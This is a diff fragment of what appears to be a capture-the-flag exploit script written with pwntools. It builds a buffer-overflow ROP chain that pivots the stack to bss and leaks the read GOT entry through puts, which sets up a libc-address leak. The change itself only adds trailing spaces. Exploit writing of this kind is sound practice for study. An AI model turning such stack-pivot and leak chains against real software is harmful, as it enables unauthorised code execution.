@@ -23,17 +23,17 @@ binsh = 0x804a014
 pay = b''
 pay += b'A'*0x28
 pay += p32(bss + 0x28)
-pay += p32(read_leave_return)
+pay += p32(read_leave_return) 
 p.send(pay)
 
 
 pay = b''
 pay += p32(bss + 0x128)
 pay += p32(puts_plt)
-pay += p32(pr)
+pay += p32(pr) 
 pay += p32(read_got)
 pay += p32(read_leave_return)
-pay += b"B" * (0x28 - len(pay))
+pay += b"B" * (0x28 - len(pay)) 
 pay += p32(bss)
 pay += p32(leave_return)
 p.send(pay)
